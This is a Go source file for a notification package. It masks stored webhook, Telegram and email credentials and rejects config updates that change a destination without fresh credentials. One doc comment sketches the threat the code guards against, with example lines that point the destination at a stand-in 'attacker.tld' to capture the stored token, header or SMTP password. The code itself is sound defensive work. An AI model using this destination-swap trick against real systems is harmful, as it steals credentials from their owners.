package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix marks credential values returned by the API. An update containing
// this prefix means preserve the stored value.
//
// A prefix instead of an empty string or single fixed value allows a recognizable
// suffix (see MaskedValue), so operators can identify a bot without pasting its key.
const MaskedPrefix = "__masked__"

// MaskedValue returns a masked value:
//
//	"__masked__"          short value, no identifying hint
//	"__masked__:...ab12cd" final six characters as an identifying hint
//
// Only the last six characters are exposed: Webhook identifiers such as WeCom keys
// and Feishu bot ids appear at the end, while common prefixes identify nothing.
// Six characters do not reconstruct the credential but help identify the destination.
// The actual marker uses the single-rune ellipsis to preserve its existing contract.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether the value is an unchanged masked API value.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig copies configuration and masks this channel's credential fields.
//
// Unknown channel kinds return an empty map, not potentially secret configuration.
// Showing an unavailable configuration is preferable to exposing credentials.
// Noncredential fields remain intact for normal UI display.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Treat nested structures such as headers as one credential. Requiring every
		// channel to classify individual nested keys would add disproportionate complexity.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means the destination changed without an
// explicit credential choice. Do not silently allow it or discard credentials;
// see PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // Destination keys that changed.
	Missing []string // Credential keys without an explicit choice.
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Destination (" + strings.Join(e.Changed, ", ") + ") changed. Re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): provide new values, or explicitly leave them blank if credentials are no longer needed. " +
		"The original credentials apply only to the previous destination; reusing them would disclose them to the new destination."
}

// PrepareConfigUpdate merges channel configuration and protects destination changes.
//
// Plain MergeConfig retains omitted keys. Since destinations and credentials are
// separate, someone able to PATCH a channel could change only its destination and
// make ARTEX send stored credentials to an endpoint they control:
//
//	webhook: url=https://attacker.tld sends the original Authorization header
//	telegram: base_url=https://attacker.tld sends /bot<original-token>/sendMessage
//	email: host=smtp.attacker.tld sends username/password after STARTTLS
//
// This requires no redirect, so redirect guards cannot stop it, and it defeats
// the masking promise that credentials are not exposed to the browser.
//
// Whenever a destination key changes, require an explicit choice for every secret:
//   - A new value replaces it.
//   - An explicit empty string clears it when no credential is required.
//   - A masked value or omitted key is rejected.
//
// Masked values mean reuse, but old credentials belong to the old destination.
// Do not silently discard optional credentials such as webhook headers or email
// passwords: that could remove authentication while returning HTTP 200, making
// the problem harder to diagnose than requiring re-entry.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("Channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// Reject masked markers inside nonstring credential values, such as a headers
	// object. MergeConfig recognizes only whole strings as masked values; a nested
	// marker would be stored literally and silently break later authentication.
	//
	// Perform this check first, before the unchanged-destination early return. Placing
	// it afterward would protect only destination changes, as an earlier test caught.
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find destination keys that actually changed. Masked values mean unchanged.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// With an unchanged destination, merge normally: preserve masked values, clear
		// empty strings, and replace other values.
		return MergeConfig(stored, incoming), nil
	}

	// A changed destination requires an explicit choice for every credential.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects mask sentinels embedded in structured values.
//
// Masking applies to an entire string value. Object fields such as headers must
// be submitted as one masked string or as a complete replacement. A marker inside
// an object cannot mean preserve and would instead be stored as actual data.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("Field %s contains masked marker %q: leave the entire field blank to keep its value, or submit a complete replacement; masked placeholders are not allowed inside structured values",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares configuration values through JSON to account for
// representation differences, such as a submitted number versus a decoded float64.
//
// Normalize blank values first: an empty string and a missing key mean the same
// thing because MergeConfig deletes explicitly empty fields. Otherwise an optional
// Telegram base_url left blank would be deleted on the first save, then compared
// as missing versus empty on the second. That false destination change would
// reject the masked token on every later save until the operator pasted it again,
// even though the destination never changed.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue uses the same blank rule as MergeConfig, namely
// strings.TrimSpace(s) == "", so deletion and equality checks cannot disagree.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig applies incoming fields over stored configuration.
//
// Rules:
//   - Masked incoming values preserve the stored value.
//   - Empty incoming strings explicitly clear the field by deleting its key.
//   - Other incoming values replace stored values.
//   - Omitted keys remain unchanged for partial-update semantics.
//
// Forms submit blank fields as empty strings, so their meaning must be explicit.
// Treat them as clearing rather than retaining a value: operators need a way to
// remove incorrect fields. Omitting a key means preserve; supplying empty means clear.
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // A masked value is unchanged; preserve the stored value.
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
